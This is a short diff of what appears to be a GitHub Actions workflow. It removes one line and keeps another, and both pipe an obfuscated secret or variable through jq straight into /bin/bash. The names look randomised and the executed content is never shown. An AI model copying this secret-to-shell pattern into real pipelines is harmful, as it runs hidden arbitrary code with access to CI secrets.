@@ -17,7 +17,6 @@ jobs:
           a0: ${{ secrets.a0 }}
         run: |
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
-          echo $ypata48305 | jq -r .uzvh24592 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
